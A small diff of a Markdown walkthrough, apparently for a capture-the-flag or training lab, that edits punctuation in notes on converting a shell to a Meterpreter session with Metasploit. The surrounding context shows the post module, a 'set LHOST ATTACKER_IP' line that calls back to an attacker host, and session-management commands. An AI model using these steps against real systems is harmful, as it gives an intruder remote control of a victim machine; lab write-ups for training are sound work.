@@ -146,7 +146,7 @@ use post/multi/manage/shell_to_meterpreter
 show options
 ```
 
-`LHOST` is marked optional but its auto-detect is unreliable across VPN and virtualisation interfaces — set it manually anyway. Leave `LPORT 4433` and `HANDLER true` alone.
+`LHOST` is marked optional but its auto-detect is unreliable across VPN and virtualisation interfaces, set it manually anyway. Leave `LPORT 4433` and `HANDLER true` alone.
 
 ### Q11 Set the required option, you may need to list all of the sessions to find your target here.
 
@@ -166,7 +166,7 @@ set LHOST ATTACKER_IP             ⚠ swap — your tun0 address
 run
 ```
 
-`Post module execution completed` prints *before* the new session opens. Press **Enter** if the prompt does not refresh. Running `run` twice creates a duplicate session; kill spares with `sessions -k <id>`. If the underlying shell has died the conversion has nothing to push through — re-run the Task 2 exploit.
+`Post module execution completed` prints *before* the new session opens. Press **Enter** if the prompt does not refresh. Running `run` twice creates a duplicate session; kill spares with `sessions -k <id>`. If the underlying shell has died the conversion has nothing to push through, re-run the Task 2 exploit.
 
 ### Q13 Once the meterpreter shell conversion completes, select that session for use.
 
